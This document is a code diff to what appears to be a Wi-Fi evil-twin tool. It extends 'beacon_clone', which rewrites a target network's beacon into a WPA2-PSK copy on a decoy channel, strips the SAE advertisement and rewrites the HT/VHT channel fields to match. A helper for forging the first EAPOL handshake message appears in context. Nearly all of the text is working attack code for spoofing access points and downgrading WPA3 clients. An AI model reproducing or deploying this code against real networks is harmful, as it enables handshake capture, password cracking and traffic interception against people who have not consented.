@@ -13,6 +13,8 @@ _CAP_ESS_PRIVACY = 0x0011
 _BEACON_HEAD = 36               # 24B MAC header + 12B fixed (timestamp, interval, capability)
 _ELEMID_DS = 0x03
 _ELEMID_RSN = 0x30
+_ELEMID_HT_OP = 0x3D           # 61 HT Operation (primary channel + secondary-channel offset)
+_ELEMID_VHT_OP = 0xC0          # 192 VHT Operation (channel width + center-frequency segments)
 _ELEMID_RSNXE = 0xF4            # RSN Extended Caps: SAE hash-to-element, MFP-required advert
 _M1_KEY_INFO = 0x008A          # Pairwise + Key ACK + key descriptor version 2 (HMAC-SHA1, PSK)
 _CCMP_KEY_LEN = 16
@@ -40,10 +42,25 @@ def eapol_m1(bssid: bytes, client: bytes, anonce: bytes, replay: int = 1) -> byt
     return data_header(to_ds=False, bssid=bssid, client=client) + LLC_SNAP_EAPOL + payload
 
 
+def _ht_op_to_channel(elem: bytes, channel: int) -> bytes:
+    body = bytearray(elem[2:])
+    if len(body) >= 2:
+        body[0] = channel & 0xFF          # primary channel
+        body[1] &= ~0x07                  # clear secondary-offset (bits 0-1) + STA width (bit 2)
+    return elem[:2] + bytes(body)
+
+
+def _vht_op_to_20mhz(elem: bytes) -> bytes:
+    body = bytearray(elem[2:])
+    if len(body) >= 3:
+        body[0] = 0                       # channel width 0 = 20/40 MHz
+        body[1] = 0                       # center-freq seg 0
+        body[2] = 0                       # center-freq seg 1
+    return elem[:2] + bytes(body)
+
+
 def beacon_clone(real_beacon: bytes, decoy_channel: int) -> bytes:
-    """The target's beacon rewritten to a WPA2-PSK twin: RSN IE forced to a single PSK AKM,
-    RSN Extended Caps dropped (SAE stripped), DS Parameter set to the decoy channel, sequence
-    zeroed for per-frame HW restamp. Every other IE (rates, HT/VHT/HE, country) is preserved."""
+    """The target's beacon rewritten to a WPA2-PSK twin."""
     if len(real_beacon) < _BEACON_HEAD:
         raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
     head = bytearray(real_beacon[:_BEACON_HEAD])
@@ -61,6 +78,10 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int) -> bytes:
             kept += force_psk_akm(bytes(elem)) or GENERIC_RSN_IE
         elif tag_id == _ELEMID_DS:
             kept += ds_param_ie(decoy_channel)
+        elif tag_id == _ELEMID_HT_OP:
+            kept += _ht_op_to_channel(bytes(elem), decoy_channel)
+        elif tag_id == _ELEMID_VHT_OP:
+            kept += _vht_op_to_20mhz(bytes(elem))
         elif tag_id != _ELEMID_RSNXE:
             kept += elem
         ptr = end
